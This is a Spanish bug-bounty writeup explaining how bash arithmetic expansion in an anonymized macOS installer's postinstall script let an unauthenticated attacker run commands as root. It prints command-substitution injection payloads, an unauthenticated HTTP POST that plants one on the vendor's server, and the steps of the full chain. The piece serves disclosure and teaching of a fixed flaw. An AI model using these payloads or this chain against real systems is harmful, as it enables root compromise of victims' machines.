---
title:       "RCE como root en un instalador de macOS: la aritmética de bash ejecuta lo que le metas"
summary:     "Un script de instalación sumaba uno a un número que venía del servidor. El problema es que en bash «sumar» significa «evaluar», y ese número lo podía escribir cualquiera por internet sin tener cuenta. Reporte aceptado y recompensado."
date:        2026-08-10 18:40:00 +0100
lang:        es
ref:         rce-instalador-macos-aritmetica
image:       /assets/img/og/rce-instalador-macos-aritmetica-es.png

severity:    high
cvss:        "8.8"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-306"
vuln_class:  "Inyección"
target_type: "Instalador de escritorio (macOS)"
platform:    "YesWeHack"
status:      "Corregido"
reward:      "Recompensado"
tags:        [rce, macos, bash, instalador, root, inyeccion-de-comandos]

takeaways:
  - "En bash, `$(( ))` y `[[ … -ge … ]]` **evalúan** su contenido. No son comparaciones inocentes: son un intérprete abierto."
  - "Entrecomillar una variable no te salva dentro de un contexto aritmético. Lo único que vale es validar que de verdad es un número."
  - "Los instaladores de escritorio corren como root y casi nadie los mira. Son superficie de ataque de primera, y suelen estar a un `curl` de distancia."
  - "Si un script pide datos a un servidor, pregúntate siempre quién puede escribir en ese servidor."
---

Este es mi primer writeup publicado, y he elegido el hallazgo del que más aprendí: una
ejecución de comandos **como root** en el Mac de cualquier usuario de una aplicación de
escritorio bastante conocida, provocada por algo que a simple vista parece inofensivo —
sumarle uno a un número.

Lo voy a contar desde el principio y sin dar nada por sabido. Si no has tocado bash en tu
vida, deberías poder seguirlo igual. Si ya lo has tocado, vas a ver el patrón y te va a
costar no buscarlo en todas partes a partir de ahora.

<div class="warn" markdown="1">
**Todo está anonimizado.** El programa autorizó la publicación con la condición de no
identificar al producto. He cambiado el nombre del fabricante, el tipo de producto, los hosts, los números de
versión y los nombres de los campos. **El mecanismo, el código y la cadena son exactos**:
lo único que no vas a encontrar aquí es a quién le pasó.
</div>

## Lo que vas a aprender

1. Por qué los instaladores de escritorio son un sitio estupendo donde mirar.
2. Qué hace realmente `$(( ))` en bash y por qué es un intérprete disfrazado de suma.
3. Cómo se traza un valor hacia atrás hasta descubrir quién lo controla.

## Por qué miré un instalador

Cuando instalas un `.pkg` en macOS, el sistema puede ejecutar dos scripts: `preinstall`
antes de copiar los ficheros y `postinstall` después. Si el paquete lo pide, esos scripts
se ejecutan **como root**, el usuario con control total de la máquina.

Cuando le das a «Instalar» y metes tu contraseña, no solo estás copiando
ficheros. Estás dejando que un script hecho por otra persona ejecute lo que quiera en tu
ordenador con permisos de administrador. Normalmente ese script hace cosas aburridas y
legítimas. Pero si alguien consigue colarle una orden, esa orden se ejecuta con esos
mismos permisos.

Y lo mejor: **un instalador es un fichero público**. Te lo descargas, lo abres y lees el
código. No hace falta tener cuenta, ni atacar nada, ni enviar una sola petición rara. Es de
las pocas superficies donde puedes leer el código fuente del objetivo antes de tocarlo:

```bash
# un .pkg es un archivo comprimido con una estructura conocida
pkgutil --expand-full instalador.pkg /tmp/instalador-abierto

# y los scripts están ahí, en texto plano
cat /tmp/instalador-abierto/*.pkg/Scripts/postinstall
```

Eso es todo. Dos comandos y estás leyendo el código que va a correr como root en el
ordenador de miles de personas.

## La línea que me hizo parar

Leyendo el `postinstall` me encontré esto:

```bash
# prepare data for feedback server
new_installation_count=$((install_count + 1))
```

Una suma. Lo más inofensivo del mundo. Y sin embargo fue donde paré, por una razón que
merece su propia sección.

## Clase magistral: `$(( ))` no suma, *evalúa*

Esto es lo más importante del artículo. Si te llevas una sola cosa, que sea esta.

En bash, `$(( ... ))` se llama **expansión aritmética**. Tú crees que le estás pidiendo
«haz esta cuenta», pero lo que de verdad le estás diciendo es «**evalúa** esto como una
expresión». Y evaluar, en bash, incluye resolver cualquier cosa que haya dentro.

Pruébalo tú mismo en una terminal. Primero, lo normal:

```bash
numero=5
echo $((numero + 1))      # 6
```

Hasta aquí ninguna sorpresa. Ahora, lo que no es tan normal:

```bash
numero='a[$(touch /tmp/me-han-colado)]'
echo $((numero + 1))      # 1  (el índice vacío vale 0, más uno)
ls -l /tmp/me-han-colado  # el fichero existe
```

Le hemos pedido a bash que sume uno a una variable. Pero esa variable no
contenía un número, contenía **una orden**. Y bash, antes de sumar, ha ejecutado la orden.
La suma devolvió un número normal y pareció que no pasaba nada — pero el fichero está
creado. Esa es toda la vulnerabilidad: en un sitio donde esperas un número, metes una
orden, y se ejecuta.

¿Por qué pasa esto? Porque dentro de `$(( ))` bash permite índices de array —
`a[algo]` — y para saber qué índice es, tiene que **resolver** lo que hay dentro de los
corchetes. Si ahí hay un `$(comando)`, lo ejecuta para averiguar el resultado. La
sustitución de comandos ocurre *antes* de la aritmética.

Y aquí viene la parte que más gente falla:

<div class="warn" markdown="1">
**Las comillas no te protegen.** Esto sigue ejecutándose:

```bash
echo $(( "$numero" + 1 ))
```

Entrecomillar sirve para que el shell no parta la variable en trozos, no para que no la
evalúe. Dentro de un contexto aritmético **el contenido se evalúa igual**. Lo mismo pasa
con `[[ "$x" -ge 10 ]]`, que mucha gente usa creyendo que es una comparación segura.
</div>

Fíjate en el detalle: con `[ "$x" -ge 10 ]` — **corchete simple**, que es el `test` de
POSIX — esto **no** ocurre: te da un error de «se esperaba un entero» y no ejecuta nada.
Es decir, el fallo no es «cosa de shell» en general: es específico de `$(( ))` y de
`[[ ]]`. Ese matiz es justo lo que separa un parámetro peligroso de uno inofensivo.

## ¿De dónde salía ese número?

Vale: hay un sitio peligroso. La pregunta siguiente no es «¿cómo lo exploto?», sino
**«¿quién decide ese valor?»**. Un `$(( ))` con un número que calculas tú mismo no tiene
el menor interés. Lo interesante es si ese número viene de fuera.

Así que seguí la variable hacia atrás por el script, y esto es lo que encontré:

```bash
# el script descarga un registro remoto identificado por install_id
curl_data=$(curl -s "https://feedback.ejemplo.tld/v2/feedback/${install_id}?plain=1")

# y lo parsea a pelo, quitando solo las comillas dobles
while IFS=':' read -r name value; do
    case "$name" in
        *installCount*) install_count="${value//\"/}" ;;
    esac
done <<< "$curl_data"
```

El instalador llama a un servidor, se baja un texto, busca una línea que
contiene la palabra `installCount` y se queda con lo que haya a la derecha, quitándole
solo las comillas. Lo que sea que el servidor haya puesto ahí, acaba dentro de la
variable. Y esa variable acaba dentro de `$(( ))`.

Es decir: **el servidor decide el valor**. Lo que me llevó a la pregunta que lo abrió todo.

## La pregunta que lo abrió todo: ¿quién puede escribir en ese servidor?

Si solo el proveedor puede escribir ese registro, esto es un fallo feo pero poco
explotable. Si puede escribirlo cualquiera, es una ejecución de comandos como root a
distancia.

Probé a escribir, sin tener cuenta ni token ni nada:

```http
POST /v2/feedback?plain=1 HTTP/2
Host: feedback.ejemplo.tld
Content-Type: application/json

{"clickId":"<mi-id-canario>",
 "clickData":{"custom":{"installCount":"a[$(id > /tmp/canario_root)]"}}}
```

```http
HTTP/2 200 OK
```

Doscientos. Sin autenticación. Cualquiera, desde cualquier sitio.

Y al leerlo de vuelta, el valor volvía **byte a byte**, sin filtrar ni escapar nada:

```http
GET /v2/feedback/<mi-id-canario>?plain=1
```

```
custom.installCount:"a[$(id > /tmp/canario_root)]"
```

## ¿Y cómo sabe el atacante mi identificador?

Buena pregunta, y es la que separa un hallazgo teórico de uno real. El `install_id` podría
haber sido un secreto imposible de adivinar. No lo era: el propio script lo saca del
**nombre del fichero descargado** y de los metadatos que macOS guarda sobre de dónde
viene:

```bash
# macOS guarda la URL de origen de cada descarga en un atributo extendido
mdls -name kMDItemWhereFroms instalador_<install_id>.pkg
```

Ese identificador viaja pegado al instalador. Va en el nombre del
fichero y en los metadatos que macOS le pone al descargarlo. Si alguien comparte su
instalador por un chat, un foro o un enlace de afiliado, está compartiendo el
identificador. No es un secreto: es una etiqueta.

## La cadena completa

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/03-cadena.svg' | relative_url }}"
       alt="Diagrama: el atacante escribe sin autenticación en el servidor de feedback, la víctima instala, el script descarga el valor y lo evalúa como root">
  <figcaption>Nadie valida nada en todo el recorrido. El valor entra como texto y sale como orden.</figcaption>
</figure>

Resumido en cinco pasos:

1. El atacante escribe un valor malicioso en el servidor de feedback. **Sin cuenta.**
2. La víctima instala o reinstala la aplicación. Acción normal y documentada.
3. El `postinstall`, corriendo **como root**, se descarga ese valor.
4. El bucle de parseo lo mete en una variable, quitándole solo las comillas.
5. `$((install_count + 1))` lo **evalúa**, y la orden se ejecuta como root.

<figure>
  <img src="{{ '/assets/img/writeups/rce-instalador-macos/01-callback.png' | relative_url }}"
       alt="Oyente fuera de banda recibiendo dos llamadas desde la maquina donde se instalo: una interaccion DNS y, un segundo despues, una peticion HTTP POST. Las direcciones IP de origen van tapadas">
  <figcaption>Un segundo después de instalar, la máquina llama a mi oyente: primero resuelve el dominio y luego hace el <code>POST</code>. El código se ejecutó. Las IP de origen son mías y van tapadas.</figcaption>
</figure>

## La parte que más me inquietó: la víctima no ve nada

Mientras leía el resto del script encontré esto:

```bash
# always exit with code 0 to not show any error in the installer
trap finish EXIT
finish() { exit 0; }
```

El script está programado para decir siempre «todo ha ido bien», pase lo
que pase. Es una decisión cómoda para que el usuario no vea errores raros. Pero significa
que, si tu orden se ejecuta y revienta el script a mitad, **el instalador sigue mostrando
una marca verde de instalación correcta**. La víctima no tiene ni un indicio.

Además el script no usaba `set -u` ni `set -e`, así que un valor mal formado tampoco lo
detenía.

## Impacto

<div class="impact" markdown="1">
**Impacto.** Ejecución de comandos arbitrarios **como root** en el Mac de la víctima al
instalar o reinstalar. Control total del equipo: lectura de cualquier fichero, instalación
de persistencia, robo de credenciales. Sin cuenta por parte del atacante y sin un solo
indicio visible para la víctima, que ve una instalación terminada con éxito.
</div>
